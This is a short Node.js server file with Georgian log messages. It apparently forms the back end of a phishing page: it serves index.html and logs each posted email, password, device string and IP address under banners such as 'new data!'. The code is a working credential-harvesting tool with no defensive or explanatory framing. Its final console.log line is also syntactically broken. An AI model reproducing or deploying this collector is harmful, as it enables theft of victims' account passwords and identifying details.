const http = require('http');
const fs = require('fs');

const server = http.createServer((req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            const data = JSON.parse(body);
            console.log('\n🔥 ახალი მონაცემები!');
            console.log('📧 EMAIL:', data.email);
            console.log('🔑 PASS:', data.pass);
            console.log('📱 DEVICE:', data.device);
            console.log('🌐 IP:', ip);
            res.end();
        });
    } else {
        fs.readFile('index.html', (err, data) => {
            res.writeHead(200, {'Content-Type': 'text/html'});
            res.end(data);
        });
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log🚀 სერვერი ჩაირთო პორტზე ${PORT}`);
});
